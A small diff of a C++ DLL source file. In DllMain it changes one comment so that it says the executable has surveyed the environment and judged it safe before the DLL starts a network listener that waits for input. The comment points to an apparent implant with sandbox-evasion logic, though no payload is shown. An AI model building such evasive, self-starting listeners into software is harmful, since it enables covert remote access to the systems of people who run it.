@@ -5,8 +5,6 @@
 #include "dllmain.h"
 
 
-
-
 BOOL startListen(fstream &debugFile)
 {
     WORD wsaVersion;
@@ -61,7 +59,7 @@ BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpRese
     switch (ul_reason_for_call)
     {
         BOOL status;
-        // Plan to call DLL for loading via rundll32 for now; make calls specific to functionality here
+        // Executable has surveyed environment and deemed it safe to operate; make calls specific to functionality here
         case DLL_PROCESS_ATTACH:
         {
             // Pass control to our listening function and wait for user input 
